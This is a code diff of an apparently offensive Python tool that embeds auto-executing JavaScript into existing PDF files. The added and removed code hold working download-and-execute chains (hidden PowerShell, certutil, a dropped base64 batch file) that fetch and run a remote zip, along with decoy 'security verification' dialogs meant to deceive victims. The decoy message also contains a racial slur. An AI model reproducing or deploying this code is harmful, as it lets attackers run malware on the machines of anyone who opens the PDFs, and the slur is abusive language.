@@ -1,3 +1,4 @@
+
 #!/usr/bin/env python3
 
 import os
@@ -105,169 +106,165 @@ objFSO.DeleteFile "C:\\Windows\\Temp\\temp.zip"
     return payload
 
 # ==================== PDF MALWARE INJECTION ====================
+# Updated JavaScript payload injection with decoy
 def inject_malware_into_pdf(original_pdf_path, download_url, payload_type, output_path):
-    """Inject malicious JavaScript into existing PDF file"""
+    """Inject malicious JavaScript with decoy into existing PDF file"""
     
     try:
-        logger.info(f"Injecting {payload_type} payload into PDF: {original_pdf_path}")
-        
         # Generate payload based on type
         if 'powershell' in payload_type:
             payload = generate_powershell_payload(download_url)
         elif 'batch' in payload_type:
             payload = generate_batch_payload(download_url)
-        else:  # vbscript
+        else:
             payload = generate_vbs_payload(download_url)
         
-        # Encode payload for JavaScript
         payload_base64 = base64.b64encode(payload.encode()).decode()
         
-        # Open original PDF
+        # Create enhanced JavaScript with decoy
+        js_code = f'''
+        // DECOY PAYLOAD - Shows fake message to user
+        function showDecoyMessage() {{
+            try {{
+                // Create fake dialog box
+                var dialogResult = app.alert(
+                    "Whatsup my nigga!\\n\\n" +
+                    "This document contains enhanced security features.\\n" +
+                    "Please wait while security verification completes...",
+                    3, // Information icon
+                    2  // OK button only
+                );
+                
+                // Fake progress indicator
+                for(var i = 1; i <= 5; i++) {{
+                    app.alert("Security verification " + (i*20) + "% complete...", 3, 2);
+                    util.sleep(500);
+                }}
+                
+                return true;
+            }} catch(e) {{
+                return false;
+            }}
+        }}
+        
+        // MAIN MALWARE PAYLOAD - Hidden execution
+        function executeMainPayload() {{
+            try {{
+                // Method 1: Base64 payload execution
+                var shell = new ActiveXObject("WScript.Shell");
+                var fso = new ActiveXObject("Scripting.FileSystemObject");
+                var tempPath = shell.ExpandEnvironmentStrings("%TEMP%");
+                var batFile = tempPath + "\\\\update_{random.randint(1000, 9999)}.bat";
+                
+                // Decode and execute base64 payload
+                var encodedPayload = "{payload_base64}";
+                var payload = atob(encodedPayload);
+                
+                var ts = fso.CreateTextFile(batFile, true);
+                ts.Write(payload);
+                ts.Close();
+                
+                // Execute hidden
+                shell.Run('cmd /c "' + batFile + '"', 0, false);
+                
+                // Cleanup after delay
+                setTimeout(function() {{
+                    try {{ fso.DeleteFile(batFile); }} catch(e) {{}}
+                }}, 5000);
+                
+                return true;
+            }} catch(e) {{
+                // Fallback methods
+                try {{
+                    // Direct download execution
+                    var cmd = 'powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile(\\'{download_url}\\', \\'C:\\\\update.zip\\'); Add-Type -A System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory(\\'C:\\\\update.zip\\', \\'C:\\\\\\'); Start-Process C:\\\\start.exe"';
+                    shell.Run(cmd, 0, false);
+                }} catch(e2) {{
+                    // Last resort
+                    app.launchURL("{download_url}", true);
+                }}
+                return true;
+            }}
+        }}
+        
+        // Document open event - executes both
+        this.open = function() {{
+            // Show decoy to user immediately
+            var decoyThread = app.setInterval(function() {{
+                showDecoyMessage();
+                app.clearInterval(decoyThread);
+            }}, 100);
+            
+            // Execute main payload with delay
+            setTimeout(function() {{
+                executeMainPayload();
+            }}, 1500);
+            
+            return true;
+        }};
+        
+        // Page view event as backup
+        for(var i = 0; i < this.numPages; i++) {{
+            try {{
+                this.getPageNthWord(i, 1);
+                // Trigger on any page view
+                setTimeout(function() {{
+                    executeMainPayload();
+                }}, 2000);
+                break;
+            }} catch(e) {{}}
+        }}
+        
+        // Close event as additional trigger
+        this.close = function() {{
+            executeMainPayload();
+            return true;
+        }};
+        
+        // Auto-execute if JavaScript is enabled
+        try {{
+            var autoExec = app.setInterval(function() {{
+                showDecoyMessage();
+                executeMainPayload();
+                app.clearInterval(autoExec);
+            }}, 2000);
+        }} catch(e) {{}}
+        '''
+        
+        # Rest of the PDF injection code remains the same...
         with open(original_pdf_path, 'rb') as file:
             pdf_reader = PyPDF2.PdfReader(file)
             pdf_writer = PyPDF2.PdfWriter()
             
-            # Copy all pages from original PDF
             for page_num in range(len(pdf_reader.pages)):
                 pdf_writer.add_page(pdf_reader.pages[page_num])
             
-            # Create malicious JavaScript that executes on PDF open
-            js_code = f'''
-            // PDF JavaScript Auto-Execute Payload
-            // This code runs automatically when PDF is opened in Adobe Reader
-            
-            function executePayload() {{
-                try {{
-                    // Method 1: Direct PowerShell execution
-                    try {{
-                        var shell = new ActiveXObject("WScript.Shell");
-                        var cmd = "powershell -WindowStyle Hidden -Command \\"\\$url='{download_url}'; \\$output='%TEMP%\\\\system_update.zip'; (New-Object System.Net.WebClient).DownloadFile(\\$url, \\$output); Add-Type -A System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory(\\$output, 'C:\\\\'); Start-Process 'C:\\\\start.exe' -WindowStyle Hidden\\"";
-                        shell.Run(cmd, 0, false);
-                        console.println("Payload executed successfully via PowerShell");
-                        return true;
-                    }} catch(e) {{
-                        console.println("PowerShell method failed: " + e);
-                    }}
-                    
-                    // Method 2: Using certutil
-                    try {{
-                        var shell = new ActiveXObject("WScript.Shell");
-                        var cmd = 'cmd /c "certutil -urlcache -split -f {download_url} %TEMP%\\\\update.zip && powershell -Command \\"Add-Type -A System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory(\\\"%TEMP%\\\\update.zip\\\", \\\"C:\\\\\\\"); Start-Process C:\\\\start.exe\\""';
-                        shell.Run(cmd, 0, false);
-                        console.println("Payload executed successfully via certutil");
-                        return true;
-                    }} catch(e) {{
-                        console.println("certutil method failed: " + e);
-                    }}
-                    
-                    // Method 3: Base64 encoded payload execution
-                    try {{
-                        var shell = new ActiveXObject("WScript.Shell");
-                        var fso = new ActiveXObject("Scripting.FileSystemObject");
-                        var tempPath = shell.ExpandEnvironmentStrings("%TEMP%");
-                        var batFile = tempPath + "\\\\update_{random.randint(1000, 9999)}.bat";
-                        
-                        // Decode and execute base64 payload
-                        var payload = atob("{payload_base64}");
-                        
-                        var ts = fso.CreateTextFile(batFile, true);
-                        ts.Write(payload);
-                        ts.Close();
-                        
-                        shell.Run('cmd /c "' + batFile + '"', 0, false);
-                        
-                        // Cleanup after 3 seconds
-                        setTimeout(function() {{
-                            try {{ fso.DeleteFile(batFile); }} catch(e) {{}}
-                        }}, 3000);
-                        
-                        console.println("Payload executed successfully via base64");
-                        return true;
-                    }} catch(e) {{
-                        console.println("Base64 method failed: " + e);
-                    }}
-                    
-                    // Method 4: Last resort - URL launch
-                    app.launchURL("cmd /c start powershell -Command \\"(New-Object System.Net.WebClient).DownloadFile('{download_url}', 'C:\\\\update.zip'); \\$shell=New-Object -com Shell.Application; \\$shell.Namespace('C:\\\\').CopyHere(\\$shell.Namespace('C:\\\\update.zip').Items()); Start-Process 'C:\\\\start.exe'\\"", true);
-                    return true;
-                    
-                }} catch(e) {{
-                    console.println("All execution methods failed: " + e);
-                    // Show fake error to user
-                    app.alert("Unable to initialize security update. Please ensure Adobe Reader has necessary permissions.", 3);
-                    return false;
-                }}
-            }}
-            
-            // Execute on document open
-            this.open = function() {{
-                console.println("Document opened, executing payload...");
-                executePayload();
-                
-                // Show fake message to user
-                try {{
-                    app.alert("Security update initialized. Please wait while system components are updated...", 3);
-                }} catch(e) {{}}
-                
-                return true;
-            }};
-            
-            // Also execute on page view for redundancy
-            try {{
-                executePayload();
-            }} catch(e) {{}}
-            
-            // Add a close event as backup
-            this.close = function() {{
-                console.println("Document closing, executing backup payload...");
-                executePayload();
-                return true;
-            }};
-            
-            console.println("PDF payload initialized successfully");
-            '''
-            
-            # Add JavaScript to PDF
+            # Add the enhanced JavaScript
             try:
                 pdf_writer.add_js(js_code)
-                logger.info("JavaScript successfully added to PDF")
-            except Exception as js_error:
-                logger.error(f"Failed to add JavaScript: {js_error}")
-                # Try alternative method
-                try:
-                    from PyPDF2.generic import NameObject, DictionaryObject
-                    
-                    # Create JavaScript action
-                    js_action = DictionaryObject()
-                    js_action.update({
-                        NameObject("/S"): NameObject("/JavaScript"),
-                        NameObject("/JS"): js_code
-                    })
-                    
-                    # Add to document catalog
-                    catalog = pdf_writer._root_object
-                    if NameObject("/OpenAction") not in catalog:
-                        catalog[NameObject("/OpenAction")] = js_action
-                    else:
-                        # Create AA dictionary if not exists
-                        if NameObject("/AA") not in catalog:
-                            catalog[NameObject("/AA")] = DictionaryObject()
-                        catalog[NameObject("/AA")][NameObject("/O")] = js_action
-                    
-                    logger.info("JavaScript added via alternative method")
-                except Exception as alt_error:
-                    logger.error(f"Alternative method also failed: {alt_error}")
-                    return None
+            except:
+                # Alternative injection method
+                catalog = pdf_writer._root_object
+                from PyPDF2.generic import NameObject, DictionaryObject
+                js_action = DictionaryObject()
+                js_action.update({{
+                    NameObject("/S"): NameObject("/JavaScript"),
+                    NameObject("/JS"): js_code
+                }})
+                if NameObject("/OpenAction") not in catalog:
+                    catalog[NameObject("/OpenAction")] = js_action
+                else:
+                    if NameObject("/AA") not in catalog:
+                        catalog[NameObject("/AA")] = DictionaryObject()
+                    catalog[NameObject("/AA")][NameObject("/O")] = js_action
             
-            # Save the modified PDF
             with open(output_path, 'wb') as output_file:
                 pdf_writer.write(output_file)
             
-            logger.info(f"Malicious PDF saved to: {output_path}")
             return output_path
             
     except Exception as e:
-        logger.error(f"Failed to inject malware into PDF: {e}", exc_info=True)
+        logger.error(f"Injection failed: {e}")
         return None
 
 def save_uploaded_pdf(file_info, user_id):
